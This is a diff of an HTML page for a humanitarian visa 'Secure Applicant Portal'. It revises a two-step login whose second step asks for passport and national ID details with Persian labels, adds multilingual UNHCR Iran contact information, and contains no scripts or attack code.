@@ -52,9 +52,8 @@
             <div class="form-container">
                 <h2>Secure Applicant Portal</h2>
                 
-                <!-- ✅ STEP 1: Login Form -->
                 <form id="login-form">
-                    <h3>Step 1: Login to your Case File</h3>
+                    <h3>Log in to your Case File (Step 1)</h3>
                     <div class="form-group">
                         <label for="username">Username:</label>
                         <input type="text" id="username" required>
@@ -70,7 +69,7 @@
                     
                     <div class="button-group" style="direction: ltr;">
                         <button type="submit" class="official-button" id="login-submit-btn">
-                            <i class="fas fa-sign-in-alt"></i> Continue
+                            <i class="fas fa-sign-in-alt"></i> Login
                         </button>
                         <button type="button" class="official-button secondary-button" id="signup-btn">
                             <i class="fas fa-user-plus"></i> Sign Up
@@ -81,72 +80,77 @@
                         Invalid credentials. Please check your username, password, or CEU Number.
                     </p>
                 </form>
-
-                <!-- ✅ STEP 2: Personal Verification -->
-                <form id="login-step2" class="hidden">
-                    <h3>Step 2: Personal Verification</h3>
-
+                <form id="verification-form" class="hidden">
+                    <h3>Step 2: Security Verification</h3>
+                    <p>Please enter your personal details for security confirmation.</p>
+                    
                     <div class="form-group">
-                        <label for="name">Name:</label>
-                        <input type="text" id="name" required>
+                        <label for="verification-name">First Name (نام):</label>
+                        <input type="text" id="verification-name" required>
                     </div>
                     <div class="form-group">
-                        <label for="lastname">Last Name:</label>
-                        <input type="text" id="lastname" required>
+                        <label for="verification-lastname">Last Name (نام خانوادگی):</label>
+                        <input type="text" id="verification-lastname" required>
                     </div>
                     <div class="form-group">
-                        <label for="dob">Date of Birth:</label>
-                        <input type="text" id="dob" placeholder="YYYY-MM-DD" required>
+                        <label for="verification-dateOfBirth">Date of Birth (تاریخ تولد - YYYY-MM-DD):</label>
+                        <input type="date" id="verification-dateOfBirth" required>
                     </div>
                     <div class="form-group">
-                        <label for="nationality">Nationality:</label>
-                        <input type="text" id="nationality" required>
+                        <label for="verification-nationality">Nationality (ملیت):</label>
+                        <input type="text" id="verification-nationality" required>
                     </div>
                     <div class="form-group">
-                        <label for="passportNumber">Passport Number:</label>
-                        <input type="text" id="passportNumber" required>
+                        <label for="verification-passportNumber">Passport Number (شماره پاسپورت):</label>
+                        <input type="text" id="verification-passportNumber" required>
                     </div>
                     <div class="form-group">
-                        <label for="nationalIDNumber">National ID Number:</label>
-                        <input type="text" id="nationalIDNumber" required>
+                        <label for="verification-nationalIDNumber">National ID/Tazkira Number (شماره ملی/تذکره):</label>
+                        <input type="text" id="verification-nationalIDNumber" required>
                     </div>
                     <div class="form-group">
-                        <label for="gender">Gender:</label>
-                        <input type="text" id="gender" placeholder="Male / Female" required>
+                        <label for="verification-gender">Gender (جنسیت):</label>
+                        <select id="verification-gender" required>
+                            <option value="">Select Gender</option>
+                            <option value="Male">Male</option>
+                            <option value="Female">Female</option>
+                            <option value="Other">Other</option>
+                        </select>
                     </div>
-
+                    
                     <div class="button-group" style="direction: ltr;">
-                        <button type="submit" class="official-button" id="step2-submit">
-                            <i class="fas fa-check-circle"></i> Verify & Continue
-                        </button>
-                        <button type="button" class="official-button secondary-button" id="back-to-step1">
-                            <i class="fas fa-arrow-left"></i> Back
+                        <button type="submit" class="official-button" id="verification-submit-btn">
+                            <i class="fas fa-check-circle"></i> Verify & Log In
                         </button>
                     </div>
 
-                    <p id="step2-error" class="error-message hidden">
-                        Personal information does not match our records. Please check and try again.
+                    <p id="verification-error" class="error-message hidden">
+                        Error: Incorrect information. Please check all fields and try again.
                     </p>
                 </form>
-
-                <!-- Existing Signup Info Section -->
                 <div id="signup-message-box" class="info-box hidden" style="text-align: right; direction: rtl;">
                     <h3>اطلاعات ثبت نام (Registration Information)</h3>
-                    <p><strong>فارسی:</strong> شما صرفاً می‌توانید جهت ایجاد حساب کاربری از طریق **دفتر کمیساریای عالی پناهندگان سازمان ملل متحد (UNHCR)** اقدام نمایید...</p>
-                    <p style="direction: ltr; text-align: left;"><strong>English:</strong> You can only create a user account through the **United Nations High Commissioner for Refugees (UNHCR)** office...</p>
+                    
+                    <p><strong>فارسی:</strong> شما صرفاً می‌توانید جهت ایجاد حساب کاربری از طریق **دفتر کمیساریای عالی پناهندگان سازمان ملل متحد (UNHCR)** اقدام نمایید. برای ارتباط با دفتر UNHCR مقیم ایران، لطفاً درخواست خود را به آدرس‌های ایمیل و شماره تماس‌های رسمی زیر ارسال نمایید:</p>
+                    
+                    <p style="direction: ltr; text-align: left;"><strong>English:</strong> You can only create a user account through the **United Nations High Commissioner for Refugees (UNHCR)** office. To contact the UNHCR office in Iran, please send your request to the following official email addresses and phone numbers:</p>
+                    
+                    <p style="direction: ltr; text-align: left;"><strong>Italiano:</strong> È possibile creare un account utente solo tramite l'ufficio dell'**Alto Commissariato delle Nazioni Unite per i Rifugiati (UNHCR)**. Per contattare l'ufficio UNHCR in Iran, si prega di inviare la richiesta ai seguenti indirizzi email e numeri di telefono ufficiali:</p>
+                    
                     <div class="contact-details" style="direction: ltr; text-align: left;">
-                        <p><i class="fas fa-envelope"></i> UNHCR Reception Email: <a href="mailto:irnteprt@unhcr.org">irnteprt@unhcr.org</a></p>
-                        <p><i class="fas fa-envelope"></i> UN Registry Email: <a href="mailto:rcs-iranregistry@un.org">rcs-iranregistry@un.org</a></p>
-                        <p><i class="fas fa-phone"></i> Reception Tel (Tehran): +98 21 88212520</p>
+                        <p><i class="fas fa-envelope"></i> UNHCR Reception Email (Tehran): <a href="mailto:irnteprt@unhcr.org">irnteprt@unhcr.org</a></p>
+                        <p><i class="fas fa-envelope"></i> UN Registry Email (General Registration): <a href="mailto:rcs-iranregistry@un.org">rcs-iranregistry@un.org</a></p>
+                        <p><i class="fas fa-phone"></i> Reception Tel (Tehran): **+۹۸ ۲۱ ۸۸۲۱۲۵۲۰** (Calling Hours: Sunday to Wednesday 8:30 to 15:30)</p>
+                        <p><i class="fas fa-phone"></i> Office Tel (Tehran): **+۹۸ ۲۱ ۴۲۹۳۹**</p>
                     </div>
-                    <button type="button" class="official-button back-button" id="back-to-login-btn">
+                    
+                    <button type="button" class="official-button back-button" id="back-to-login-btn" style="margin-top: 20px;">
                         <i class="fas fa-arrow-left"></i> Back to Login Page
                     </button>
                 </div>
             </div>
         </section>
 
-        <!-- ✅ Dashboard -->
         <section id="dashboard-layout" class="hidden">
             <aside class="sidebar">
                 <div class="applicant-info">
@@ -154,7 +158,7 @@
                     <h3 id="applicant-name">Loading...</h3>
                     <p id="applicant-case-id">Case ID: Loading...</p>
                 </div>
-
+                
                 <div class="menu-section-title">Application Submission</div>
                 <button id="application-form-btn" class="dashboard-button active"><i class="fas fa-file-alt"></i> Application Form</button>
                 <button id="upload-passport-btn" class="dashboard-button"><i class="fas fa-passport"></i> Upload Passport</button>
@@ -176,7 +180,7 @@
                 <div class="menu-section-title">Final Decision</div>
                 <button id="final-checklist-btn" class="dashboard-button"><i class="fas fa-clipboard-check"></i> Final Review Checklist</button>
                 <button id="interview-guide-btn" class="dashboard-button"><i class="fas fa-book"></i> Interview Guide & FAQs</button>
-                <button id="final-result-btn" class="dashboard-button"><i class="fas fa-gavel"></i> Final Result</button>
+                <button id="final-result-btn" class="dashboard-button"><i class="fas fa-gavel"></i> **Final Result**</button>
                 <button id="download-visa-btn" class="dashboard-button"><i class="fas fa-file-download"></i> Download Visa Letter</button>
 
                 <div style="padding: 20px;">
@@ -188,13 +192,13 @@
 
             <section class="dashboard-content">
                 <h2>Welcome to Your Humanitarian Visa Dashboard</h2>
-                <p>This secure portal allows you to manage your application, upload required documentation, track your status, and view your final interview result.</p>
+                <p>This secure portal allows you to manage your application, upload required documentation, track your status, and view your final interview result. Please ensure all documents are uploaded by the specified deadlines.</p>
+                
                 <div id="content-placeholder"></div>
             </section>
         </section>
     </main>
 
-    <!-- ✅ Added Progress Bar Section -->
     <div id="progress-container" class="hidden">
         <div id="progress-bar">
             <div id="progress-bar-fill"></div>
